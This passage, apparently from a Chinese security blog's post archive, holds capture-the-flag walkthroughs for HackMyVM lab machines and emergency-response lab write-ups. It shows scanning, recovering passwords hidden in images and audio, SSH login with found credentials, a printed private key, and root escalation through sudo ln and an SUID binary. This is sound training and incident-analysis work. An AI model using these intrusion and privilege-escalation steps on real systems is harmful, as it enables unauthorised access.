class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.178  08:00:27:d1:eb:7a       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.217  b4:0f:b3:8e:31:07       vivo Mobile Communication Co., Ltd.</span><br><span class=\"line\">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class=\"line\"></span><br><span class=\"line\">5 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 2.000 seconds (128.00 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip是192.168.31.178，nmap扫描一下端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.178 --min-rate=1000 -p-</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 01:27 EST</span><br><span class=\"line\">Nmap scan report for helium (192.168.31.178)</span><br><span class=\"line\">Host is up (0.0046s latency).</span><br><span class=\"line\">Not shown: 65533 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 08:00:27:D1:EB:7A (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# curl 192.168.31.178</span><br><span class=\"line\">&lt;title&gt;RELAX&lt;/title&gt;</span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- Please paul, stop uploading weird .wav files using /upload_sound --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">body &#123;</span><br><span class=\"line\">  background-image: url(&#x27;screen-1.jpg&#x27;);</span><br><span class=\"line\">  background-repeat: no-repeat;</span><br><span class=\"line\">  background-attachment: fixed;</span><br><span class=\"line\">  background-size: 100% 100%;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">    &lt;link href=&quot;bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;audio src=&quot;relax.wav&quot; preload=&quot;auto loop&quot; controls&gt;&lt;/audio&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n\n<p>有注释paul可能是ssh的账号，relax.wav下载下了之后没有东西，/bootstrap.min.css给了一个wav文件，用Audacity分析频谱能发现<code>dancingpassyo</code>，ssh登录试试，登录成功</p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">paul@MiWiFi-RA71-srv:~$ sudo -l</span><br><span class=\"line\">sudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname</span><br><span class=\"line\">Matching Defaults entries for paul on MiWiFi-RA71-srv:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User paul may run the following commands on MiWiFi-RA71-srv:</span><br><span class=\"line\">    (ALL : ALL) NOPASSWD: /usr/bin/ln</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">paul@MiWiFi-RA71-srv:~$ sudo ln  -fs /bin/sh /bin/usr/ln</span><br><span class=\"line\">sudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname</span><br><span class=\"line\"># id</span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>\n\n<p>提权成功</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"HackmyVM-Twisted","url":"/2025/01/24/HackmyVM-Twisted/","content":"<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1><h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.22   08:00:27:63:fe:59       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class=\"line\"></span><br><span class=\"line\">4 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip为192.168.31.22.  nmap扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.22 --min-rate=1000 -p-</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 02:14 EST</span><br><span class=\"line\">Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 95.30% done; ETC: 02:15 (0:00:01 remaining)</span><br><span class=\"line\">Nmap scan report for twisted (192.168.31.22)</span><br><span class=\"line\">Host is up (0.0065s latency).</span><br><span class=\"line\">Not shown: 65533 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">2222/tcp open  EtherNetIP-1</span><br><span class=\"line\">MAC Address: 08:00:27:63:FE:59 (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds</span><br></pre></td></tr></table></figure>\n\n<p>2222端口为ssh端口</p>\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# curl 192.168.31.22</span><br><span class=\"line\">&lt;h1&gt;I love cats!&lt;/h1&gt;</span><br><span class=\"line\">&lt;img src=&quot;cat-original.jpg&quot; alt=&quot;Cat original&quot;  width=&quot;400&quot; height=&quot;400&quot;&gt;</span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;h1&gt;But I prefer this one because seems different&lt;/h1&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;img src=&quot;cat-hidden.jpg&quot; alt=&quot;Cat Hidden&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>80端口存在两张jpg图片</p>\n<p>下载下了用stegseek查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# stegseek cat-original.jpg</span><br><span class=\"line\">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class=\"line\"></span><br><span class=\"line\">[i] Found passphrase: &quot;westlife&quot;</span><br><span class=\"line\">[i] Original filename: &quot;markus.txt&quot;.</span><br><span class=\"line\">[i] Extracting to &quot;cat-original.jpg.out&quot;.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# stegseek cat-hidden.jpg</span><br><span class=\"line\">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class=\"line\"></span><br><span class=\"line\">[i] Found passphrase: &quot;sexymama&quot;</span><br><span class=\"line\">[i] Original filename: &quot;mateo.txt&quot;.</span><br><span class=\"line\">[i] Extracting to &quot;cat-hidden.jpg.out&quot;.</span><br></pre></td></tr></table></figure>\n\n<p>给了两个ssh的账号密码</p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>先登录markus</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">markus@MiWiFi-RA71-srv:~$ cat note.txt</span><br><span class=\"line\">Hi bonita,</span><br><span class=\"line\">I have saved your id_rsa here: /var/cache/apt/id_rsa</span><br><span class=\"line\">Nobody can find it.</span><br></pre></td></tr></table></figure>\n\n<p>给了一个提示，是bonita用户的id_rsa</p>\n<p>suid提权看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">markus@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null</span><br><span class=\"line\">/home/bonita/beroot</span><br><span class=\"line\">/usr/bin/su</span><br><span class=\"line\">/usr/bin/umount</span><br><span class=\"line\">/usr/bin/gpasswd</span><br><span class=\"line\">/usr/bin/passwd</span><br><span class=\"line\">/usr/bin/mount</span><br><span class=\"line\">/usr/bin/chfn</span><br><span class=\"line\">/usr/bin/chsh</span><br><span class=\"line\">/usr/bin/newgrp</span><br><span class=\"line\">/usr/lib/openssh/ssh-keysign</span><br><span class=\"line\">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class=\"line\">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>\n\n<p><code>/home/bonita/beroot</code>这个很可疑但是没有权限，登录mateo看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mateo@MiWiFi-RA71-srv:~$ cat note.txt</span><br><span class=\"line\">/var/www/html/gogogo.wav</span><br></pre></td></tr></table></figure>\n\n<p>下载下了，用Audacity查看，能发现这是莫斯，解码得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GO DEEPER... COME WITH ME... LITTLE RABBIT...</span><br></pre></td></tr></table></figure>\n\n<p>没啥用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mateo@MiWiFi-RA71-srv:~$ /usr/sbin/getcap -r / 2&gt;/dev/null</span><br><span class=\"line\">/usr/bin/ping = cap_net_raw+ep</span><br><span class=\"line\">/usr/bin/tail = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure>\n\n<p>getcap可以查看文件的特殊权限，tail可以读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mateo@MiWiFi-RA71-srv:~$ tail /var/cache/apt/id_rsa -n 100</span><br><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class=\"line\">NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd</span><br><span class=\"line\">FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS</span><br><span class=\"line\">olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1</span><br><span class=\"line\">vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF</span><br><span class=\"line\">gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C</span><br><span class=\"line\">tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM</span><br><span class=\"line\">gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC</span><br><span class=\"line\">xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8</span><br><span class=\"line\">DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H</span><br><span class=\"line\">uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD</span><br><span class=\"line\">XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu</span><br><span class=\"line\">U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI</span><br><span class=\"line\">mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/</span><br><span class=\"line\">hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro</span><br><span class=\"line\">nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK</span><br><span class=\"line\">mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+</span><br><span class=\"line\">bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq</span><br><span class=\"line\">yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP</span><br><span class=\"line\">UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh</span><br><span class=\"line\">V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ</span><br><span class=\"line\">LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz</span><br><span class=\"line\">a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF</span><br><span class=\"line\">eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu</span><br><span class=\"line\">D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>ssh登陆，将beroot下载ida分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v4; // [rsp+1Ch] [rbp-4h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  printf(&quot;Enter the code:\\n &quot;);</span><br><span class=\"line\">  scanf(&quot;%i&quot;, &amp;v4);</span><br><span class=\"line\">  if ( v4 == 5880 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    setuid(0);</span><br><span class=\"line\">    setgid(0);</span><br><span class=\"line\">    system(&quot;/bin/bash&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(&quot;\\nWRONG&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>只要输入等于5880就会执行/bin/bash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bonita@MiWiFi-RA71-srv:~$ ./beroot</span><br><span class=\"line\">Enter the code:</span><br><span class=\"line\"> 5880</span><br><span class=\"line\">root@MiWiFi-RA71-srv:~#</span><br></pre></td></tr></table></figure>\n\n<p>提权结束</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"应急响应靶机训练-Web1","url":"/2025/02/07/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web1/","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">前景需要：小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件：</span><br><span class=\"line\">1.攻击者的shell密码</span><br><span class=\"line\">2.攻击者的IP地址</span><br><span class=\"line\">3.攻击者的隐藏账户名称</span><br><span class=\"line\">4.攻击者挖矿程序的矿池域名(仅域名)</span><br><span class=\"line\">5.有实力的可以尝试着修复漏洞</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"1-攻击者的shell密码\"><a href=\"#1-攻击者的shell密码\" class=\"headerlink\" title=\"1.攻击者的shell密码\"></a>1.攻击者的shell密码</h1><p>打开phpstudy找到网站的根目录，然后用D盾扫</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/1.png\"></p>\n<p>能找到是一个冰蝎马，密码是rebeyond</p>\n<h1 id=\"2-攻击者的IP地址\"><a href=\"#2-攻击者的IP地址\" class=\"headerlink\" title=\"2.攻击者的IP地址\"></a>2.攻击者的IP地址</h1><p>查看phpstudy的日志文件，有apache和nginx，nginx的日志全是0kb，打开apache的access.log文件搜索shell.php能找到攻击者的ip</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/2.png\"></p>\n<h1 id=\"3-攻击者的隐藏账户名称\"><a href=\"#3-攻击者的隐藏账户名称\" class=\"headerlink\" title=\"3.攻击者的隐藏账户名称\"></a>3.攻击者的隐藏账户名称</h1><p>可以直接查看C盘的用户有一个hack168$</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/3.png\"></p>\n<p>或者可以查看登录的日志，如果不用工具的话就在事件查看器里-安全找事件ID为4624的事件</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/4.png\"></p>\n<h1 id=\"4-攻击者挖矿程序的矿池域名-仅域名\"><a href=\"#4-攻击者挖矿程序的矿池域名-仅域名\" class=\"headerlink\" title=\"4.攻击者挖矿程序的矿池域名(仅域名)\"></a>4.攻击者挖矿程序的矿池域名(仅域名)</h1><p>在C:\\Users\\hack168$\\Desktop里有一个Kuang，这是一个python编译的exe文件，先转一下pyc然后反编译就行了</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/6.png\"></p>\n<h1 id=\"5-有实力的可以尝试着修复漏洞\"><a href=\"#5-有实力的可以尝试着修复漏洞\" class=\"headerlink\" title=\"5.有实力的可以尝试着修复漏洞\"></a>5.有实力的可以尝试着修复漏洞</h1><p>phpstudy将web服务启动，是一个EMGLOG服务，后台的账号密码是admin/123456</p>\n<p><a href=\"https://blog.csdn.net/W13680336969/article/details/137267677\">https://blog.csdn.net/W13680336969/article/details/137267677</a></p>\n<p>打上最新的补丁，并把admin的密码改掉</p>\n<h1 id=\"6-非预期\"><a href=\"#6-非预期\" class=\"headerlink\" title=\"6.非预期\"></a>6.非预期</h1><p>桌面上有一个解体的校验程序，和kuang一样，exe-&gt;pyc然后反编译</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/5.png\"></p>\n","categories":["应急响应"],"tags":["靶机"]},{"title":"应急响应靶机训练-Web2","url":"/2025/02/08/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/","content":"<h1 id=\"1-攻击者的IP地址（两个）？\"><a href=\"#1-攻击者的IP地址（两个）？\" class=\"headerlink\" title=\"1.攻击者的IP地址（两个）？\"></a>1.攻击者的IP地址（两个）？</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/3.png\"></p>\n<p>第一个ip在apache的日志里，另一个是登录日志可以直接用工具windows1check或者事件查看器里查找</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/4.png\"></p>\n<h1 id=\"2-攻击者的webshell文件名？\"><a href=\"#2-攻击者的webshell文件名？\" class=\"headerlink\" title=\"2.攻击者的webshell文件名？\"></a>2.攻击者的webshell文件名？</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/1.png\"></p>\n<p>查看apache的日志发现system.php是webshell的文件名</p>\n<h1 id=\"3-攻击者的webshell密码？\"><a href=\"#3-攻击者的webshell密码？\" class=\"headerlink\" title=\"3.攻击者的webshell密码？\"></a>3.攻击者的webshell密码？</h1><p>密码是hcak6618</p>\n<h1 id=\"4-攻击者的伪QQ号？\"><a href=\"#4-攻击者的伪QQ号？\" class=\"headerlink\" title=\"4.攻击者的伪QQ号？\"></a>4.攻击者的伪QQ号？</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/5.png\"></p>\n<p>众所周知，qq登陆过后会默认会在文档里创建一个Tencent File里面会记录每个登陆过的qq号，在FileRecv里是通过qq下载的文件</p>\n<h1 id=\"5-攻击者的伪服务器IP地址？\"><a href=\"#5-攻击者的伪服务器IP地址？\" class=\"headerlink\" title=\"5.攻击者的伪服务器IP地址？\"></a>5.攻击者的伪服务器IP地址？</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/6.png\"></p>\n<p>黑客通过qq下载了一个frp，在frpc的配置文件里有伪服务器IP和端口</p>\n<h1 id=\"6-攻击者的服务器端口？\"><a href=\"#6-攻击者的服务器端口？\" class=\"headerlink\" title=\"6.攻击者的服务器端口？\"></a>6.攻击者的服务器端口？</h1><p>65536</p>\n<h1 id=\"7-攻击者是如何入侵的（选择题）？\"><a href=\"#7-攻击者是如何入侵的（选择题）？\" class=\"headerlink\" title=\"7.攻击者是如何入侵的（选择题）？\"></a>7.攻击者是如何入侵的（选择题）？</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/7.png\"></p>\n<p>通过分析ftp的日志文件可以发现，攻击者通过爆破ftp admin的密码登录成功，然后上传system.php文件</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/8.png\"></p>\n<p>看phpstudy的ftp配置可以发现ftp的根目录在www目录，所以上传的system.php可以访问到</p>\n<h1 id=\"8-攻击者的隐藏用户名？\"><a href=\"#8-攻击者的隐藏用户名？\" class=\"headerlink\" title=\"8.攻击者的隐藏用户名？\"></a>8.攻击者的隐藏用户名？</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/2.png\"></p>\n<p>学到新招，win+r-&gt;cmd-&gt;lusrmgr.msc可以查看本地用户和组，或者C盘USER能找到hack887$</p>\n","categories":["应急响应"],"tags":["靶机"]},{"title":"应急响应靶机训练-Web3","url":"/2025/02/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web3/","content":"<h1 id=\"隐藏用户名称\"><a href=\"#隐藏用户名称\" class=\"headerlink\" title=\"隐藏用户名称\"></a>隐藏用户名称</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/1.png\"></p>\n<p>这还没开始第一道题就已经结束了 </p>\n<h1 id=\"攻击者的两个IP地址\"><a href=\"#攻击者的两个IP地址\" class=\"headerlink\" title=\"攻击者的两个IP地址\"></a>攻击者的两个IP地址</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/2.png\"></p>\n<p>远程登录找到一个ip</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/3.png\"></p>\n<p>在hacker的目录下能找到一个system.bat的文件，可以看到向web里面写了一个webshell，可以去查看apache的日志</p>\n<p>还有第一个flag</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/4.png\"></p>\n<p>第二个IP</p>\n<h1 id=\"黑客遗留下的flag【3个】\"><a href=\"#黑客遗留下的flag【3个】\" class=\"headerlink\" title=\"黑客遗留下的flag【3个】\"></a>黑客遗留下的flag【3个】</h1><p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/5.png\"></p>\n<p>计划任务里有一个flag</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/6.png\"></p>\n<p>可以看到web是一个Z-blog，去官网下载一个修改后台密码的工具</p>\n<p><a href=\"https://bbs.zblogcn.com/thread-83419.html\">https://bbs.zblogcn.com/thread-83419.html</a></p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/7.png\"></p>\n<p>可以看到还有一个hacker用户</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/8.png\"></p>\n<p>第三个flag</p>\n","categories":["应急响应"],"tags":["靶机"]},{"title":"HackmyVM-Chromee","url":"/2025/03/21/Chromee/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>arp-scan -l</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.2    08:00:27:01:8c:4d       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.100  08:00:27:f9:e1:65       PCS Systemtechnik GmbH</span><br><span class=\"line\"></span><br><span class=\"line\">3 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip为192.168.31.100,然后用nmap扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.100 -p-</span><br><span class=\"line\">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 07:14 EDT</span><br><span class=\"line\">Nmap scan report for chromee.hmv (192.168.31.100)</span><br><span 